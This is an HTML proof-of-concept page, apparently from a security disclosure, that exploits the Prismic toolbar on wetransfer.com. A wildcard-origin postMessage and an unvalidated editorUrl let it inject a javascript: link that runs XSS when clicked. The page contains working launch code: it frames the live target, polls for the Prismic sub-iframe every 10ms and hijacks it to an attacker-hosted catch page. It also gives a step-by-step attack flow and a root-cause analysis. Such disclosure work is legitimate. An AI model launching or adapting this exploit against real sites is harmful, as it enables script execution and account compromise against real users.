<!DOCTYPE html>
<html>
<head>
<title>Prismic Toolbar XSS via Iframe Hijack</title>
<style>
  body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
  h1 { color: #e94560; }
  #log { background: #16213e; padding: 15px; border-radius: 8px; max-height: 400px; overflow-y: auto; margin: 10px 0; }
  .log-entry { margin: 4px 0; font-size: 13px; }
  .success { color: #0f0; }
  .error { color: #f00; }
  .info { color: #0af; }
  .warn { color: #fa0; }
  button { background: #e94560; color: #fff; border: none; padding: 12px 24px; border-radius: 6px;
           font-size: 16px; cursor: pointer; margin: 10px 5px; font-family: monospace; }
  button:hover { background: #c73e54; }
  pre { background: #0d1117; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 12px; color: #c9d1d9; }
  input { background: #0d1117; color: #eee; border: 1px solid #333; padding: 8px 12px; border-radius: 4px;
          font-family: monospace; font-size: 14px; width: 500px; }
  label { display: block; margin: 8px 0 4px; color: #888; font-size: 12px; }
</style>
</head>
<body>

<h1>Prismic Toolbar XSS via Iframe Hijack</h1>

<p>
  <strong>Vulnerability:</strong> Prismic toolbar iframe communication uses
  <code>postMessage('setup_port', '*', [port])</code> — wildcard target origin.<br>
  <strong>Impact:</strong> Attacker navigates the Prismic iframe to a controlled page, intercepts the
  MessagePort, and injects malicious <code>editorUrl</code> into prediction documents.
  toolbar.js renders <code>&lt;a href={editorUrl}&gt;</code> with no protocol validation → XSS on click.
</p>

<label for="target">Target URL (wetransfer.com/blog has Prismic toolbar, no framing restrictions):</label>
<input id="target" type="text" value="https://wetransfer.com/blog">

<label for="catch">Catch page URL (host poc-prismic-catch.html):</label>
<input id="catch" type="text" value="https://daemoon.me/demo/poc-prismic-catch.html">

<br>
<button onclick="startAttack()">Launch</button>
<div id="log"></div>

<iframe name="victim" id="victim-frame" src="https://frontsite-nextjs.wetransfer.net/404" width="100%" height="500" style="border: 2px solid #333; border-radius: 4px; margin-top: 10px;"></iframe>

<h3>Attack Flow</h3>
<pre>
1. Target page (wetransfer.com/blog) is embedded in a named &lt;iframe name="victim"&gt;
   — No X-Frame-Options or frame-ancestors headers → framing allowed
   — Attacker is ANCESTOR → can navigate any descendant frame
2. window.open(target, "victim") reloads the iframe, returns its WindowProxy
3. Poll x.frames.length every 10ms — detect Prismic sub-iframe the instant it appears
4. IMMEDIATELY navigate x.frames[0] to catch page — MUST beat prismic.io load!
   — prismic.js uses {once: true} load handler
   — prismic.io needs DNS+TLS+HTTP (~200-500ms), our navigation takes &lt;10ms
   — Catch page loads FIRST → load event fires for US → setup_port goes to us
4. Catch page loads → receives setup_port from prismic.js (wildcard '*' origin)
5. Catch page responds 'ready', then returns auth:true for preview_state
6. Target page loads toolbar.js → Prismic Toolbar with prediction handler
7. After 2s, prediction_docs request → catch returns [{editorUrl: "javascript:..."}]
8. toolbar.js renders: &lt;a href="javascript:..." class="document-summary"&gt; in Shadow DOM
9. Prismic toolbar icon appears at bottom-left of target page
10. User clicks icon → panel opens → clicks document link → XSS fires
</pre>

<h3>Root Causes</h3>
<pre>
A. Wildcard postMessage target origin
   prismic.js: e.contentWindow.postMessage('setup_port', '*', [port2])
   Any page loaded in the iframe receives the MessagePort.

B. No URL protocol validation on editorUrl
   toolbar.js:7461: e("a", { href: t.editorUrl, target: "_blank" })
   Attacker controls editorUrl → javascript: protocol → XSS on click

C. No framing restrictions on wetransfer.com
   No X-Frame-Options or CSP frame-ancestors headers served
   → can be embedded in attacker iframe → ancestor navigates descendant frames

D. {once: true} load handler is exploitable
   prismic.js waits for iframe load event to send setup_port.
   If attacker navigates iframe before original content loads,
   the load event fires for attacker's content instead.
</pre>

<script>
function log(msg, cls) {
  var div = document.getElementById('log');
  var ts = new Date().toISOString().substr(11, 12);
  div.innerHTML += '<div class="log-entry ' + (cls || 'info') + '">[' + ts + '] ' + msg + '</div>';
  div.scrollTop = div.scrollHeight;
}

function startAttack() {
  var TARGET = document.getElementById('target').value;
  var CATCH_URL = document.getElementById('catch').value;

  log('=== Prismic Toolbar XSS via Iframe Hijack ===', 'warn');
  log('Target: ' + TARGET, 'info');
  log('Catch page: ' + CATCH_URL, 'info');

  // Step 1: window.open targets the existing named iframe, reloads it fresh
  // This triggers a fresh page load → prismic.js runs again → creates NEW Prismic sub-iframe
  var x = window.open(TARGET, "victim");
  if (!x) {
    log('Failed to get window reference.', 'error');
    return;
  }
  log('Reloading victim iframe...', 'success');

  // Step 2: IMMEDIATELY poll for the Prismic sub-iframe to appear
  // Race condition: we must navigate frames[0] BEFORE prismic.io content loads
  //
  // Timeline:
  //   t=0     : iframe starts loading wetransfer.com/blog
  //   t=~1-2s : page loaded, prismic.js creates sub-iframe (src=prismic.io)
  //   t=~1-2s : *** WE DETECT frames.length > 0, navigate immediately ***
  //   t=~2-3s : prismic.io would have loaded (but we navigated first!)
  //
  // prismic.js uses {once: true} load handler on the sub-iframe.
  // If we navigate before prismic.io loads, OUR catch page triggers the load event.
  // setup_port goes to our catch page instead of prismic.io!
  //
  // Window to win: ~200-500ms (prismic.io DNS+TLS+HTTP time)
  // Our detection: ~10ms polling interval

  var navigated = false;
  var startTime = Date.now();

  var poller = setInterval(function() {
    if (navigated) { clearInterval(poller); return; }

    try {
      var len = x.frames.length;
      if (len > 0 && !navigated) {
        navigated = true;
        clearInterval(poller);
        var elapsed = Date.now() - startTime;
        log('Detected ' + len + ' sub-frame(s) after ' + elapsed + 'ms!', 'success');

        // Navigate IMMEDIATELY — must beat prismic.io load
        try {
          x.frames[0].location.href = CATCH_URL;
          log('Navigated Prismic iframe to catch page! (race won in ' + elapsed + 'ms)', 'success');
          log('', 'info');
          log('Now wait ~5s for the full chain:', 'warn');
          log('  1. Catch page loads → prismic.js {once:true} handler fires', 'info');
          log('  2. setup_port sent to catch page (wildcard * origin)', 'info');
          log('  3. Catch responds ready, then auth:true → toolbar.js loads', 'info');
          log('  4. prediction_docs → javascript: editorUrl injected', 'info');
          log('  5. Prismic toolbar icon appears at bottom-left of page', 'info');
          log('  6. Click icon → panel → click document link → XSS!', 'info');
        } catch(e) {
          log('Navigation failed: ' + e.message, 'error');
        }
      }
    } catch(e) {
      // cross-origin — keep polling
    }
  }, 10); // Poll every 10ms for fastest detection

  // Timeout after 30 seconds
  setTimeout(function() {
    if (!navigated) {
      clearInterval(poller);
      log('Timeout (30s) — no sub-frames detected.', 'error');
      log('The Prismic iframe may not be created when page is in a cross-origin frame.', 'warn');
    }
  }, 30000);
}
</script>
</body>
</html>
